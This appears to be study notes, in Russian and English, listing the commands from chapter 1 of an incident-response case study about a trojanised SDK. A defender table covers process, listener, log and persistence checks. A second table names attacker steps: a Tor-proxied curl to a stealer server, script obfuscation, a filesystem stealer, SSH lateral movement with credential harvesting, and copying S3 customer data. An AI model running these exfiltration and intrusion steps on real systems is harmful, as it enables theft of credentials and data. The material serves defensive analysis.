# Команды и инструменты Chapter 1

Только команды и инструменты, явно присутствующие в RAG главы 1. Attacker-side команды включены исключительно как evidence понимания attack chain, а не как рекомендации.

## Defender / responder side

| Команда | Назначение в главе | Тип | Provenance |
|---|---|---|---|
| `sudo docker run --rm -it -h novaflow --name novaflow -p 8080:80 novaflow-lemonlime-4.31` | Запуск dev container; выявляет конфликт TCP/8080 | state-changing / workload-generating | p0028 |
| `ss -natp \| grep LISTEN \| grep 8080` | Найти listener на 8080 | read-only | p0028 |
| `ps -f 18450` | Проверить процесс `ms` | read-only | p0028 |
| `ps -f 18449` | Проверить parent process | read-only | p0029 |
| `ps --ppid 18449 -f` | Перечислить child processes update script | read-only | p0029 |
| `ss -natp \| grep LISTEN \| grep -E "ms|ssupd|gilded-sdk-update"` | Найти listeners, связанные с SDK | read-only | p0029 |
| `cat /opt/gilded/SDK/setup/gilded-sdk-update` | Просмотреть installer/update script | read-only | p0030 |
| `killall ms ssupd gilded-sdk-update` | Остановить suspicious processes | state-changing | p0030 |
| `ps -ef \| grep -E "ssupd|gilded|ms"` | Проверить, остались ли процессы | read-only | p0030 |
| `sudo rm -fr /opt/gilded/` | Удалить SDK tree | state-changing / destructive | p0030 |
| `ps -ef \| grep -E "ms|ssupd|gilded"` | Проверка workstation во время IR | read-only | p0040 |
| `ls -la /opt/gilded/` | Проверить наличие SDK directory | read-only | p0040 |
| `ss -natp \| grep -E "8080|9150"` | Проверить listeners | read-only | p0040 |
| `journalctl --since "6 days ago" \| grep -i "gilded\|ssupd\|ms.*8080"` | Historical process evidence | read-only | p0040 |
| `journalctl --since "Apr 07 16:34" --until "Apr 07 16:42" \| grep -i "connect\|network\|tcp"` | Historical network evidence | read-only | p0040-p0041 |
| `crontab -l -u jm` | Проверить user cron persistence | read-only | p0041 |
| `ls -la /etc/systemd/system/ \| grep -i "gilded\|ssupd\|ms"` | Проверить systemd persistence | read-only | p0041 |
| `ls -la /home/jm/.config/autostart/ 2>/dev/null` | Проверить desktop autostart | read-only | p0041 |

## Attacker-side commands / tooling shown by the source

Эти команды описывают действия Pyrix и нужны для reconstruction attack path.

| Команда / инструмент | Действие в кейсе | Тип | Provenance |
|---|---|---|---|
| MiniServe | Локальный web server, дающий filesystem access/upload | attacker tooling | p0031-p0034 |
| Tor hidden service / SOCKS | Anonymous remote access и network pivot | attacker tooling | p0031-p0032 |
| `curl -x socks5h://127.0.0.1:9150 ...` | Notify server-side stealer через Tor | workload-generating / attacker | p0032 |
| `bash-obfuscate gilded-sdk-update-orig -o gilded-sdk-update` | Обфускация launch script | state-changing / attacker | p0032 |
| `python stealer-wip.py <onion-url>` | Automated filesystem harvesting | workload-generating / attacker | p0034-p0035 |
| `python recon.py --proxy ... --key ... --known-hosts ...` | SSH lateral movement через victim SOCKS proxy | workload-generating / attacker | p0036 |
| `python recon.py --proxy ... --ssh jm@nfdev-01... --harvest` | Harvest credentials на dev server | workload-generating / attacker | p0036 |
| `aws sts get-caller-identity` | Проверить stolen AWS identity | read-only, attacker context | p0037 |
| `aws s3 ls` | Перечислить S3 buckets | read-only, attacker context | p0037 |
| `aws s3 ls s3://novarise-customer-data --recursive --human-readable --summarize` | Перечислить customer data | read-only, attacker context | p0037-p0038 |
| `aws s3 ls s3://novarise-algo-assets --recursive --human-readable --summarize` | Перечислить algorithm assets | read-only, attacker context | p0038 |
| `aws s3 cp s3://... /tmp/staging/` | Скопировать target data на staging EC2 | state-changing / attacker | p0039 |

## Risk notes

### `killall`

Что меняет:
- завершает процессы.

Риск:
- возможна потеря volatile/live evidence;
- не устраняет уже украденные credentials или downstream access.

Verification:
- повторная проверка `ps`.

Rollback:
- `[Needs confirmation]`.

### `rm -fr /opt/gilded/`

Что меняет:
- необратимо удаляет SDK tree в рамках показанного state.

Риск:
- уничтожает локальные forensic artifacts;
- не влияет на attacker resources и stolen data вне host.

Verification:
- `ls -la /opt/gilded/` подтверждает отсутствие directory.

Rollback:
- `[Needs confirmation]`.

## Команды, которых Chapter 1 не даёт

Глава прямо говорит, что Sam должен был исследовать:

- CloudTrail activity;
- unexpected SSH-key use;
- same SDK on other developer machines;
- attacker-created cloud resources.

Но concrete commands для этих проверок Chapter 1 не приводит.

По source policy они здесь не добавляются из model memory.
